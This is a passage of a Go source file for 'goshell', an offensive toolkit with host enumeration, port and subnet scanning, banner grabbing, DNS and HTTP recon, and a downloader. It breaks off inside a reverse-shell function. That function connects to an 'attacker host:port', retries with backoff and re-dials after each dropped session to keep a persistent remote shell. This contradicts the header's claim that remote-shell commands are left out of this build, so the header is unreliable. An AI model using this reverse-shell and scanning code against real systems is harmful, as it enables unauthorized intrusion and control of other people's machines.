// goshell v1.0 — Nishang-inspired offensive-security toolkit, engineered
// for longevity: only long-lived standards (TCP/UDP, TLS 1.2+/1.3, RFC3339
// time, dual-stack IPv4/IPv6) and the Go standard library's stable surface.
// Defensive assessment modules across gather / scan / dns / recon / utility /
// privesc / filesystem categories. Remote-shell, proxy, relay, and exfiltration
// commands are not registered in this hardened build.
//
// Longevity rules:
//   1. Zero third-party deps; builds with any Go >= 1.22 toolchain.
//   2. TLS 1.2+ only (TLS 1.0/1.1 obsoleted by RFC 8996), 1.3 preferred.
//   3. 64-bit time everywhere (Y2038-safe), RFC3339 output.
//   4. Context cancellation on every long-running module (SIGINT/SIGTERM).
//   5. Dual-stack IPv4/IPv6 networking (netip where possible).
//   6. Retry with capped exponential backoff + crypto/rand full jitter.
//   7. Interface-based registry: a new module is one register() call.
//   8. Structured logging via log/slog, deterministic help output.
//
// NOT included by design: keylogger, credential/Wi-Fi dumping, AV-evasion
// droppers, defender-defeating tricks. Authorized testing only.

package main

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"log/slog"
	"math/big"
	"net"
	"net/http"
	"net/netip"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"path/filepath"
	"regexp"
	"runtime"
	"slices"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const version = "0.6.0"

// ===========================================================================
// 1. Infrastructure: context, logging, config, backoff
// ===========================================================================

func rootContext() (context.Context, context.CancelFunc) {
	ctx, cancel := context.WithCancel(context.Background())
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-ch
		slog.Warn("interrupt received, shutting down")
		cancel()
	}()
	return ctx, cancel
}

func init() {
	slog.SetDefault(slog.New(slog.NewTextHandler(os.Stderr, nil)))
}

type Config struct {
	RetryMax        int           `json:"retry_max"`
	RetryBase       time.Duration `json:"-"`
	DialTimeout     time.Duration `json:"-"`
	ScanConcurrency int           `json:"scan_concurrency"`
	KeepAlive       time.Duration `json:"-"`
}

// UnmarshalJSON accepts human-friendly duration strings ("500ms", "5s") in
// config files while keeping typed time.Duration in code. Unknown fields are
// ignored for forward compatibility.
func (c *Config) UnmarshalJSON(b []byte) error {
	type alias struct {
		RetryMax        int    `json:"retry_max"`
		RetryBase       string `json:"retry_base"`
		DialTimeout     string `json:"dial_timeout"`
		ScanConcurrency int    `json:"scan_concurrency"`
		KeepAlive       string `json:"keepalive"`
	}
	var a alias
	if err := json.Unmarshal(b, &a); err != nil {
		return fmt.Errorf("parse config: %w", err)
	}
	*c = defaultConfig()
	if a.RetryMax > 0 {
		c.RetryMax = a.RetryMax
	}
	if a.ScanConcurrency > 0 {
		c.ScanConcurrency = a.ScanConcurrency
	}
	for _, d := range []struct {
		s string
		t *time.Duration
	}{
		{a.RetryBase, &c.RetryBase},
		{a.DialTimeout, &c.DialTimeout},
		{a.KeepAlive, &c.KeepAlive},
	} {
		if d.s == "" {
			continue
		}
		v, err := time.ParseDuration(d.s)
		if err != nil {
			return fmt.Errorf("bad duration %q: %w", d.s, err)
		}
		*d.t = v
	}
	return c.validate()
}

func defaultConfig() Config {
	return Config{
		RetryMax:        5,
		RetryBase:       500 * time.Millisecond,
		DialTimeout:     5 * time.Second,
		ScanConcurrency: 512,
		KeepAlive:       30 * time.Second,
	}
}

func (c *Config) validate() error {
	var errs []error
	if c.RetryMax < 0 {
		errs = append(errs, fmt.Errorf("retry_max must be >= 0"))
	}
	if c.RetryBase <= 0 {
		errs = append(errs, fmt.Errorf("retry_base must be > 0"))
	}
	if c.DialTimeout <= 0 {
		errs = append(errs, fmt.Errorf("dial_timeout must be > 0"))
	}
	if c.ScanConcurrency < 1 || c.ScanConcurrency > 65536 {
		errs = append(errs, fmt.Errorf("scan_concurrency must be in [1,65536]"))
	}
	return errors.Join(errs...)
}

func loadConfig(path string) (Config, error) {
	cfg := defaultConfig()
	if path == "" {
		return cfg, nil
	}
	b, err := os.ReadFile(path)
	if err != nil {
		return cfg, fmt.Errorf("config read failed (using defaults): %w", err)
	}
	if err := json.Unmarshal(b, &cfg); err != nil {
		return defaultConfig(), err
	}
	return cfg, nil
}

const maxBackoff = 30 * time.Second

// jitteredBackoff returns base + full-jitter in [0, base<<attempt], capped at
// maxBackoff. Uses crypto/rand so timing is not predictable.
func jitteredBackoff(attempt int, base time.Duration) time.Duration {
	if base <= 0 {
		base = 100 * time.Millisecond
	}
	shift := min(max(attempt, 0), 5) // cap shift to avoid overflow
	capDur := base << uint(shift)
	if capDur <= 0 || capDur > maxBackoff {
		capDur = maxBackoff
	}
	// Full jitter: return a value in [0, capDur], never exceed maxBackoff.
	var b [8]byte
	if _, err := rand.Read(b[:]); err != nil {
		return capDur / 2
	}
	return time.Duration(binary.LittleEndian.Uint64(b[:]) % (uint64(capDur) + 1))
}

// ===========================================================================
// 2. Module registry
// ===========================================================================

type Module interface {
	Name() string
	Category() string
	Desc() string
	Usage() string
	Run(ctx context.Context, cfg Config, args []string) error
}

type module struct {
	n, c, d, u string
	fn         func(context.Context, Config, []string) error
}

func (m *module) Name() string     { return m.n }
func (m *module) Category() string { return m.c }
func (m *module) Desc() string     { return m.d }
func (m *module) Usage() string    { return m.u }
func (m *module) Run(ctx context.Context, cfg Config, a []string) error {
	return m.fn(ctx, cfg, a)
}

var (
	modulesMu sync.RWMutex
	modules   []Module
)

func register(n, c, d, u string, fn func(context.Context, Config, []string) error) {
	modulesMu.Lock()
	defer modulesMu.Unlock()
	modules = append(modules, &module{n, c, d, u, fn})
}

func findModule(name string) Module {
	modulesMu.RLock()
	defer modulesMu.RUnlock()
	for _, m := range modules {
		if strings.EqualFold(m.Name(), name) {
			return m
		}
	}
	return nil
}

func modulesByCategory() (order []string, cats map[string][]Module) {
	modulesMu.RLock()
	defer modulesMu.RUnlock()
	cats = map[string][]Module{}
	for _, m := range modules {
		if _, ok := cats[m.Category()]; !ok {
			order = append(order, m.Category())
		}
		cats[m.Category()] = append(cats[m.Category()], m)
	}
	sort.Strings(order)
	return order, cats
}

// parseFlags is a helper so every module reports flag errors cleanly instead
// of exiting mid-module.
func parseFlags(fs *flag.FlagSet, args []string) error {
	fs.SetOutput(io.Discard)
	if err := fs.Parse(args); err != nil {
		return fmt.Errorf("bad flags (%s): %w", fs.Name(), err)
	}
	return nil
}

// ===========================================================================
// 3. Networking core
// ===========================================================================

func tlsConfig() *tls.Config {
	return &tls.Config{
		MinVersion:         tls.VersionTLS12, // TLS 1.0/1.1 obsoleted (RFC 8996)
		ClientSessionCache: tls.NewLRUClientSessionCache(32),
	}
}

func dialContext(ctx context.Context, cfg Config, network, addr string, useTLS bool) (net.Conn, error) {
	d := &net.Dialer{Timeout: cfg.DialTimeout, KeepAlive: cfg.KeepAlive}
	if useTLS {
		return (&tls.Dialer{NetDialer: d, Config: tlsConfig()}).DialContext(ctx, network, addr)
	}
	return d.DialContext(ctx, network, addr)
}

func listen(ctx context.Context, addr string) (net.Listener, error) {
	// ":port" binds the wildcard — dual-stack on all supported platforms.
	ln, err := (&net.ListenConfig{}).Listen(ctx, "tcp", addr)
	if err != nil {
		return nil, err
	}
	go func() {
		<-ctx.Done()
		_ = ln.Close()
	}()
	return ln, nil
}

// httpTransport returns a shared, hardened Transport (fresh per call to keep
// IdleConn hygiene simple in a short-lived CLI process).
func httpTransport() *http.Transport {
	return &http.Transport{
		TLSClientConfig:       tlsConfig(),
		ForceAttemptHTTP2:     true,
		MaxIdleConns:          16,
		IdleConnTimeout:       30 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		ResponseHeaderTimeout: 30 * time.Second,
	}
}

func newHTTPClient(cfg Config, redirectPolicy func(*http.Request, []*http.Request) error) *http.Client {
	return &http.Client{
		Transport:     httpTransport(),
		Timeout:       cfg.DialTimeout + 25*time.Second,
		CheckRedirect: redirectPolicy,
	}
}

// ===========================================================================
// 4. gather: sysinfo / users / procs / services / netstat / route
// ===========================================================================

func cmdSysInfo(ctx context.Context, cfg Config, args []string) error {
	outf := func(format string, a ...any) { fmt.Printf(format+"\n", a...) }
	outf("=== System Information ===")
	h, _ := os.Hostname()
	outf("Hostname:      %s", h)
	outf("OS/Arch:       %s / %s", runtime.GOOS, runtime.GOARCH)
	outf("Go runtime:    %s", runtime.Version())
	outf("CPUs:          %d", runtime.NumCPU())
	outf("Time (UTC):    %s", time.Now().UTC().Format(time.RFC3339))
	outf("Working dir:   %s", mustWD())
	outf("Temp dir:      %s", os.TempDir())
	if u, err := user.Current(); err == nil {
		outf("User:          %s (uid=%s gid=%s) elevated=%v", u.Username, u.Uid, u.Gid, isPrivileged(u))
	}
	outf("\n=== Environment (interesting) ===")
	for _, k := range []string{"PATH", "HOME", "USERPROFILE", "TEMP",
		"COMPUTERNAME", "LOGONSERVER", "PROXY"} {
		if v := os.Getenv(k); v != "" {
			outf("%-14s %s", k+":", v)
		}
	}
	outf("\n=== Network Interfaces (dual-stack) ===")
	ifaces, err := net.Interfaces()
	if err != nil {
		return err
	}
	for _, ifc := range ifaces {
		addrs, _ := ifc.Addrs()
		ips := make([]string, 0, len(addrs))
		for _, a := range addrs {
			ips = append(ips, a.String())
		}
		outf("%-14s %-18s %s", ifc.Name, ifc.HardwareAddr, strings.Join(ips, ", "))
	}
	return nil
}

func isPrivileged(u *user.User) bool {
	if runtime.GOOS == "windows" {
		return strings.Contains(u.Uid, "S-1-5-32-544")
	}
	return u.Uid == "0"
}

func mustWD() string { wd, _ := os.Getwd(); return wd }

func cmdListUsers(ctx context.Context, cfg Config, args []string) error {
	switch runtime.GOOS {
	case "windows":
		return runCmd(ctx, "net", "user")
	case "linux", "darwin":
		return runCmd(ctx, "getent", "passwd")
	}
	return fmt.Errorf("unsupported platform %s", runtime.GOOS)
}

// cmdProcs lists running processes. On Linux it reads /proc directly — no
// dependency on ps being installed or unaliased; falls back to ps elsewhere.
func cmdProcs(ctx context.Context, cfg Config, args []string) error {
	if runtime.GOOS == "linux" {
		if err := procsFromProc(ctx); err == nil {
			return nil
		}
		// fall through to ps if /proc was unreadable
	}
	if runtime.GOOS == "windows" {
		return runCmd(ctx, "tasklist")
	}
	return runCmd(ctx, "sh", "-c", "ps aux 2>/dev/null || ps -ef")
}

// procsFromProc walks /proc/<pid> and reports PID, UID and command line.
func procsFromProc(ctx context.Context) error {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return err
	}
	fmt.Printf("%-8s %-8s %s\n", "PID", "UID", "COMMAND")
	for _, e := range entries {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		pid, err := strconv.Atoi(e.Name())
		if err != nil {
			continue // not a process directory
		}
		uid := procUID(pid)
		cmdline := procCmdline(pid)
		if cmdline == "" {
			cmdline = "[" + procName(pid) + "]"
		}
		fmt.Printf("%-8d %-8d %s\n", pid, uid, cmdline)
	}
	return nil
}

func procUID(pid int) int {
	b, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return -1
	}
	for _, line := range strings.Split(string(b), "\n") {
		if strings.HasPrefix(line, "Uid:") {
			f := strings.Fields(line)
			if len(f) >= 2 {
				if u, err := strconv.Atoi(f[1]); err == nil {
					return u
				}
			}
		}
	}
	return -1
}

func procCmdline(pid int) string {
	b, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil || len(b) == 0 {
		return ""
	}
	return strings.Join(strings.Split(string(b), "\x00"), " ")
}

func procName(pid int) string {
	b, err := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid))
	if err != nil {
		return "?"
	}
	return strings.TrimSpace(string(b))
}

func cmdServices(ctx context.Context, cfg Config, args []string) error {
	if runtime.GOOS == "windows" {
		return runCmd(ctx, "sc", "query", "state=", "all")
	}
	return runCmd(ctx, "sh", "-c",
		"systemctl list-units --type=service --all 2>/dev/null || service --status-all 2>/dev/null")
}

func cmdNetStat(ctx context.Context, cfg Config, args []string) error {
	if runtime.GOOS == "windows" {
		return runCmd(ctx, "netstat", "-ano")
	}
	return runCmd(ctx, "sh", "-c", "ss -tulpen 2>/dev/null || netstat -tulpen 2>/dev/null || netstat -an")
}

func cmdRoute(ctx context.Context, cfg Config, args []string) error {
	if runtime.GOOS == "windows" {
		return runCmd(ctx, "route", "print")
	}
	return runCmd(ctx, "sh", "-c", "ip route 2>/dev/null || route -n")
}

func runCmd(ctx context.Context, name string, a ...string) error {
	cmd := exec.CommandContext(ctx, name, a...)
	cmd.Stdout, cmd.Stderr = os.Stdout, os.Stderr
	return cmd.Run()
}

// ===========================================================================
// 5. scan: portscan / sweep / banner
// ===========================================================================

func cmdPortScan(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("scan", flag.ContinueOnError)
	host := fs.String("h", "", "target host (IPv4 or IPv6)")
	ports := fs.String("p", "1-1024", "port range or comma list")
	timeout := fs.Duration("t", 800*time.Millisecond, "per-probe timeout")
	conc := fs.Int("c", cfg.ScanConcurrency, "concurrency")
	network := fs.String("net", "tcp", "tcp, tcp4 or tcp6")
	jsonOut := fs.Bool("json", false, "machine-readable JSON result on stdout")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *host == "" || !slices.Contains([]string{"tcp", "tcp4", "tcp6"}, *network) {
		fs.Usage()
		return errors.New("scan requires -h and a valid -net value")
	}
	if *timeout <= 0 {
		return errors.New("scan timeout must be > 0")
	}
	if *conc < 1 || *conc > 4096 {
		return errors.New("scan concurrency must be in [1,4096]")
	}
	list, err := parsePorts(*ports)
	if err != nil {
		return err
	}
	// Resolve once up front so each probe dials an IP, not a name per-port.
	ips, err := net.LookupHost(*host)
	if err != nil {
		return fmt.Errorf("resolve %q: %w", *host, err)
	}
	if len(ips) == 0 {
		return fmt.Errorf("resolve %q: no addresses returned", *host)
	}
	if *network == "tcp4" || *network == "tcp6" {
		want4 := *network == "tcp4"
		filtered := make([]string, 0, len(ips))
		for _, candidate := range ips {
			ip := net.ParseIP(candidate)
			if ip != nil && ((ip.To4() != nil) == want4) {
				filtered = append(filtered, candidate)
			}
		}
		if len(filtered) == 0 {
			return fmt.Errorf("host %q has no address compatible with %s", *host, *network)
		}
		ips = filtered
	}

	var mu sync.Mutex
	var open []int
	var wg sync.WaitGroup
	sem := make(chan struct{}, max(*conc, 1))
	start := time.Now()
	for _, p := range list {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			select {
			case sem <- struct{}{}:
			case <-ctx.Done():
				return
			}
			defer func() { <-sem }()
			conn, err := (&net.Dialer{Timeout: *timeout}).DialContext(ctx,
				*network, net.JoinHostPort(ips[0], strconv.Itoa(p)))
			if err != nil {
				return
			}
			_ = conn.Close()
			mu.Lock()
			open = append(open, p)
			if !*jsonOut {
				fmt.Printf("  open  %s:%d (%s)\n", *host, p, portLabel(p))
			}
			mu.Unlock()
		}(p)
	}
	wg.Wait()
	sort.Ints(open)
	if *jsonOut {
		result := struct {
			Host       string `json:"host"`
			IP         string `json:"ip"`
			Scanned    int    `json:"scanned"`
			Open       []int  `json:"open"`
			DurationMs int64  `json:"duration_ms"`
			Timestamp  string `json:"timestamp"`
		}{
			Host: *host, IP: ips[0], Scanned: len(list), Open: open,
			DurationMs: time.Since(start).Milliseconds(),
			Timestamp:  start.UTC().Format(time.RFC3339),
		}
		enc := json.NewEncoder(os.Stdout)
		enc.SetIndent("", "  ")
		return enc.Encode(result)
	}
	fmt.Printf("\n%d open port(s) on %s of %d scanned in %s\n",
		len(open), *host, len(list), time.Since(start).Round(time.Millisecond))
	return ctx.Err()
}

const maxSweepAddrs = 65536

// sweep — host discovery across a CIDR by probing a small set of common
// ports in parallel; reports hosts with any port accepting connections.
func cmdSweep(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("sweep", flag.ContinueOnError)
	cidr := fs.String("c", "", "CIDR network, e.g. 10.0.0.0/24")
	ports := fs.String("p", "22,80,443,445", "probe ports")
	timeout := fs.Duration("t", 700*time.Millisecond, "per-probe timeout")
	conc := fs.Int("c2", 256, "concurrency")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *cidr == "" {
		fs.Usage()
		return errors.New("sweep requires -c CIDR")
	}
	prefix, err := netip.ParsePrefix(*cidr)
	if err != nil {
		return fmt.Errorf("bad CIDR %q: %w", *cidr, err)
	}
	plist, err := parsePorts(*ports)
	if err != nil {
		return err
	}
	// Pre-count so oversized networks fail fast instead of mid-scan.
	bits := prefix.Bits()
	hostBits := prefix.Addr().BitLen() - bits
	if prefix.Addr().Is4() && !prefix.Addr().Is4In6() {
		// netip reports IPv4 BitLen as 32; mask below keeps semantics simple.
		hostBits = 32 - bits
	}
	if hostBits > 0 && 1<<uint(min(hostBits, 62)) > maxSweepAddrs {
		return fmt.Errorf("network too large: max %d addresses", maxSweepAddrs)
	}

	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, max(*conc, 1))
	start := time.Now()
	count := 0
	for addr := prefix.Masked().Addr(); prefix.Contains(addr) && count < maxSweepAddrs; addr = addr.Next() {
		if ctx.Err() != nil {
			break
		}
		count++
		wg.Add(1)
		go func(ip netip.Addr) {
			defer wg.Done()
			select {
			case sem <- struct{}{}:
			case <-ctx.Done():
				return
			}
			defer func() { <-sem }()
			for _, p := range plist {
				conn, err := (&net.Dialer{Timeout: *timeout}).DialContext(ctx, "tcp",
					netip.AddrPortFrom(ip, uint16(p)).String())
				if err != nil {
					continue
				}
				_ = conn.Close()
				mu.Lock()
				fmt.Printf("  up    %s (port %d open)\n", ip, p)
				mu.Unlock()
				return
			}
		}(addr)
	}
	wg.Wait()
	fmt.Printf("\nsweep of %s done in %s\n", *cidr, time.Since(start).Round(time.Millisecond))
	return ctx.Err()
}

// banner — connect to open ports and read whatever they announce.
func cmdBanner(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("banner", flag.ContinueOnError)
	host := fs.String("h", "", "target host")
	ports := fs.String("p", "22,80,443,3306,8080", "ports")
	wait := fs.Duration("t", 3*time.Second, "read timeout per port")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *host == "" {
		fs.Usage()
		return errors.New("banner requires -h")
	}
	plist, err := parsePorts(*ports)
	if err != nil {
		return err
	}
	report := func(p int, raw []byte, silent bool) {
		if silent {
			fmt.Printf("%s:%-6d (open, no banner)\n", *host, p)
			return
		}
		fmt.Printf("%s:%-6d %s\n", *host, p,
			strings.TrimSpace(strings.ReplaceAll(string(raw), "\n", " ")))
	}
	for _, p := range plist {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		conn, err := dialContext(ctx, cfg, "tcp",
			net.JoinHostPort(*host, strconv.Itoa(p)), false)
		if err != nil {
			continue
		}
		buf := make([]byte, 512)
		readOnce := func() []byte {
			_ = conn.SetReadDeadline(time.Now().Add(*wait))
			n, _ := conn.Read(buf)
			return buf[:n]
		}
		raw := readOnce()
		if len(raw) == 0 {
			// silent service: nudge with CRLF, then try once more
			_, _ = conn.Write([]byte("\r\n"))
			raw = readOnce()
		}
		report(p, raw, len(raw) == 0)
		_ = conn.Close()
	}
	return nil
}

func parsePorts(s string) ([]int, error) {
	seen := map[int]bool{}
	var out []int
	for _, part := range strings.Split(s, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		lo, hi := 0, 0
		if strings.Contains(part, "-") {
			b := strings.SplitN(part, "-", 2)
			var e1, e2 error
			if lo, e1 = strconv.Atoi(b[0]); e1 != nil {
				return nil, fmt.Errorf("bad port %q", part)
			}
			if hi, e2 = strconv.Atoi(b[1]); e2 != nil {
				return nil, fmt.Errorf("bad port %q", part)
			}
			if lo < 1 || hi > 65535 || lo > hi {
				return nil, fmt.Errorf("bad range %q", part)
			}
		} else {
			var e error
			if lo, e = strconv.Atoi(part); e != nil || lo < 1 || lo > 65535 {
				return nil, fmt.Errorf("bad port %q", part)
			}
			hi = lo
		}
		for p := lo; p <= hi; p++ {
			if !seen[p] {
				seen[p] = true
				out = append(out, p)
			}
		}
	}
	if len(out) == 0 {
		return nil, errors.New("no ports specified")
	}
	sort.Ints(out)
	return out, nil
}

func portLabel(p int) string {
	switch p {
	case 21:
		return "ftp"
	case 22:
		return "ssh"
	case 23:
		return "telnet"
	case 25:
		return "smtp"
	case 53:
		return "dns"
	case 80:
		return "http"
	case 110:
		return "pop3"
	case 135:
		return "msrpc"
	case 139:
		return "netbios"
	case 443:
		return "https"
	case 445:
		return "smb"
	case 1433:
		return "mssql"
	case 3306:
		return "mysql"
	case 3389:
		return "rdp"
	case 5432:
		return "pgsql"
	case 8080:
		return "http-alt"
	}
	return ""
}

// ===========================================================================
// 6. dns: lookup / reverse
// ===========================================================================

func cmdDNSLookup(ctx context.Context, cfg Config, args []string) error {
	if len(args) < 1 {
		return errors.New("usage: goshell dnslookup <domain> [a|aaaa|mx|txt|ns|cname|srv]")
	}
	name := args[0]
	kind := "a"
	if len(args) > 1 {
		kind = strings.ToLower(args[1])
	}
	r := &net.Resolver{}
	ctx2, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	switch kind {
	case "a", "aaaa":
		network := "ip"
		if kind == "aaaa" {
			network = "ip6"
		}
		addrs, err := r.LookupIP(ctx2, network, name)
		if err != nil {
			return err
		}
		for _, a := range addrs {
			fmt.Println(strings.ToUpper(kind), a)
		}
	case "mx":
		mx, err := r.LookupMX(ctx2, name)
		if err != nil {
			return err
		}
		for _, m := range mx {
			fmt.Printf("MX %s pref=%d\n", m.Host, m.Pref)
		}
	case "txt":
		txt, err := r.LookupTXT(ctx2, name)
		if err != nil {
			return err
		}
		for _, t := range txt {
			fmt.Println("TXT", t)
		}
	case "ns":
		ns, err := r.LookupNS(ctx2, name)
		if err != nil {
			return err
		}
		for _, n := range ns {
			fmt.Println("NS", n.Host)
		}
	case "cname":
		cn, err := r.LookupCNAME(ctx2, name)
		if err != nil {
			return err
		}
		fmt.Println("CNAME", cn)
	case "srv":
		if len(args) < 3 {
			return errors.New("srv needs service+proto, e.g. dnslookup example.com _xmpp._tcp srv")
		}
		service, proto, ok := strings.Cut(strings.TrimPrefix(args[1], "_"), ".")
		if !ok {
			service, proto = args[1], "tcp"
		}
		_, srvs, err := r.LookupSRV(ctx2, service, proto, name)
		if err != nil {
			return err
		}
		for _, s := range srvs {
			fmt.Printf("SRV %s:%d prio=%d weight=%d\n", s.Target, s.Port, s.Priority, s.Weight)
		}
	default:
		return fmt.Errorf("unknown record type %q", kind)
	}
	return nil
}

func cmdRevDNS(ctx context.Context, cfg Config, args []string) error {
	if len(args) < 1 {
		return errors.New("usage: goshell revdns <ip> [ip2 ...]")
	}
	r := &net.Resolver{}
	for _, s := range args {
		if !strings.Contains(s, ":") { // cheap sanity: IPv6 contains ':'
			if ip := net.ParseIP(s); ip == nil {
				fmt.Printf("%-40s (invalid IP)\n", s)
				continue
			}
		}
		ctx2, cancel := context.WithTimeout(ctx, 10*time.Second)
		names, err := r.LookupAddr(ctx2, s)
		cancel()
		if err != nil || len(names) == 0 {
			fmt.Printf("%-40s (no PTR)\n", s)
			continue
		}
		fmt.Printf("%-40s %s\n", s, strings.Join(names, ", "))
	}
	return nil
}

// ===========================================================================
// 7. recon: httphead (fingerprint) / download (fetch file)
// ===========================================================================

func cmdHTTPHead(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("httphead", flag.ContinueOnError)
	ua := fs.String("ua", "goshell/"+version, "custom User-Agent")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	rest := fs.Args()
	if len(rest) < 1 {
		fs.Usage()
		return errors.New("usage: goshell httphead [-ua agent] <url>")
	}
	url := rest[0]
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		url = "https://" + url
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", *ua)
	// Fingerprint, don't follow redirects — show them instead.
	cl := newHTTPClient(cfg, func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	})
	resp, err := cl.Do(req)
	if err != nil {
		return err
	}
	defer func() { _ = resp.Body.Close() }()
	fmt.Printf("URL:     %s\nStatus:  %s\n", url, resp.Status)
	if resp.TLS != nil {
		printTLSDetails(resp.TLS)
	}
	keys := make([]string, 0, len(resp.Header))
	for k := range resp.Header {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		low := strings.ToLower(k)
		if strings.Contains(low, "server") || strings.Contains(low, "powered") ||
			strings.HasPrefix(low, "x-") || low == "content-type" || low == "location" {
			fmt.Printf("%-28s %s\n", k+":", strings.Join(resp.Header.Values(k), ", "))
		}
	}
	// grab <title> if HTML
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	if t := extractTag(string(body), "title"); t != "" {
		fmt.Printf("Title:   %s\n", t)
	}
	return nil
}

func extractTag(s, tag string) string {
	lower := strings.ToLower(s)
	i := strings.Index(lower, "<"+tag+">")
	if i < 0 {
		return ""
	}
	j := strings.Index(lower[i:], "</"+tag+">")
	if j < 0 {
		return ""
	}
	return strings.TrimSpace(s[i+len(tag)+2 : i+j])
}

// printTLSDetails reports the negotiated protocol and the leaf certificate's
// subject, issuer, SANs and expiry — the facts a pentest report needs.
func printTLSDetails(cs *tls.ConnectionState) {
	fmt.Printf("TLS:     %s / %s\n", tls.VersionName(cs.Version), tls.CipherSuiteName(cs.CipherSuite))
	if len(cs.PeerCertificates) == 0 {
		return
	}
	cert := cs.PeerCertificates[0]
	fmt.Printf("CertSubject: %s\n", cert.Subject.String())
	fmt.Printf("CertIssuer:  %s\n", cert.Issuer.String())
	if len(cert.DNSNames) > 0 {
		fmt.Printf("CertSANs:    %s\n", strings.Join(cert.DNSNames, ", "))
	}
	days := int(time.Until(cert.NotAfter).Hours() / 24)
	status := "valid"
	if time.Now().After(cert.NotAfter) {
		status = "EXPIRED"
	} else if days < 30 {
		status = fmt.Sprintf("expiring in %dd", days)
	}
	fmt.Printf("CertExpiry:  %s (%s)\n", cert.NotAfter.Format(time.RFC3339), status)
}

func cmdDownload(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("download", flag.ContinueOnError)
	url := fs.String("u", "", "source URL")
	out := fs.String("o", "", "output file (default: basename of URL)")
	ua := fs.String("ua", "goshell/"+version, "custom User-Agent")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *url == "" {
		fs.Usage()
		return errors.New("download requires -u")
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, *url, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", *ua)
	cl := newHTTPClient(cfg, nil)
	resp, err := cl.Do(req)
	if err != nil {
		return err
	}
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("HTTP %s", resp.Status)
	}
	dest := *out
	if dest == "" {
		dest = filepath.Base(req.URL.Path)
		if dest == "" || dest == "." || dest == "/" {
			dest = "download.bin"
		}
	}
	if st, statErr := os.Lstat(dest); statErr == nil {
		if st.Mode()&os.ModeSymlink != 0 {
			return fmt.Errorf("refusing to overwrite symlink %q", dest)
		}
		return fmt.Errorf("destination already exists: %q", dest)
	} else if !errors.Is(statErr, os.ErrNotExist) {
		return statErr
	}
	tmp, err := os.CreateTemp(filepath.Dir(dest), ".goshell-download-*")
	if err != nil {
		return err
	}
	tmpName := tmp.Name()
	defer os.Remove(tmpName)
	const maxDownload = int64(1 << 30)
	n, err := io.Copy(tmp, io.LimitReader(resp.Body, maxDownload+1))
	if err == nil && n > maxDownload {
		err = fmt.Errorf("download exceeds 1 GiB safety limit")
	}
	if cerr := tmp.Close(); err == nil {
		err = cerr
	}
	if err != nil {
		return err
	}
	if err := os.Link(tmpName, dest); err != nil {
		return fmt.Errorf("publish download without overwriting destination: %w", err)
	}
	fmt.Printf("saved %s (%d bytes) → %s\n", *url, n, dest)
	return nil
}

// ===========================================================================
// 8. shells: reverse & bind
// ===========================================================================

func cmdReverseShell(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("rev", flag.ContinueOnError)
	addr := fs.String("a", "", "attacker host:port")
	tlsOn := fs.Bool("tls", false, "TLS 1.2+ connection")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *addr == "" {
		fs.Usage()
		return errors.New("rev requires -a host:port")
	}
	var lastErr error
	for attempt := 0; attempt <= cfg.RetryMax; attempt++ {
		if ctx.Err() != nil {
			if lastErr != nil {
				return fmt.Errorf("%w (last dial error: %v)", ctx.Err(), lastErr)
			}
			return ctx.Err()
		}
		conn, err := dialContext(ctx, cfg, "tcp", *addr, *tlsOn)
		if err != nil {
			if errors.Is(err, context.Canceled) {
				return err
			}
			lastErr = err
			wait := jitteredBackoff(attempt, cfg.RetryBase)
			slog.Warn("dial failed; backing off", "err", err, "attempt", attempt+1, "wait", wait.String())
			select {
			case <-time.After(wait):
				continue
			case <-ctx.Done():
				return ctx.Err()
			}
		}
		slog.Info("session established", "peer", conn.RemoteAddr().String())
		interactiveShell(ctx, conn)
		_ = conn.Close()
		select { // brief pause before re-dialing a dropped session
		case <-time.After(2 * time.Second):
		case <-ctx.Done():
			return ctx.Err()
		}
		attempt = -1 // session was established; reset the retry budget
	}
	if lastErr != nil {
